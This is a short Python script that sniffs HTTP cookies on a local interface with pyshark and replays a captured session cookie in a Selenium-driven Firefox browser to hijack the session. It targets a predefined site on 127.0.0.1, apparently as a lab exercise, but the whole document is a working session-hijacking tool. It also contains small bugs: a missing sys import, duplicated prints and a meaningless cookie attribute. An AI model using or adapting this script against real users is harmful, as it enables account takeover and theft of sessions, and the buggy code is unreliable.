import pyshark
from selenium import webdriver

USER_AGENT = "selenium"
change_cookie = True

if (len(sys.argv) > 0):
    change_cookie = True

def parse_cookies(cookies):
    cookies = cookies.split('; ')
    result = []
    for cookie in cookies:
        spl = cookie.split('=')
        result.append({"name": spl[0], "value": spl[1]})
    return result

# predefined websites
websites = {"127.0.0.1":"kotki"}

### capturing packets ###
# read from live interface
capture = pyshark.LiveCapture(
    interface="lo", display_filter="http.cookie"
)

for packet in capture.sniff_continuously():
    if (packet.http.user_agent == USER_AGENT):
        continue # ignore if request sent from the webdriver agent

    # check if the packet comes from the predefined websites
    if (packet.http.host in websites):
        # parse cookies from the website
        cookie = parse_cookies(packet.http.cookie)
        # iterate on the array with cookies
        for i in cookie:
            print("Session ID: ", i["value"])
            if i["name"] == websites[packet.http.host]:
                print("Session ID: ", i["value"])
                if change_cookie:
                    # custom user-agent
                    prof = webdriver.FirefoxProfile()
                    prof.set_preference("general.useragent.override", USER_AGENT)

                    # launch the browser
                    browser = webdriver.Firefox(prof)
                    browser.get('http://' + packet.http.host + packet.http.request_uri)
                    browser.add_cookie(i)
                    i["Same site"] = "Lex"
                    browser.refresh()
    else:
        continue


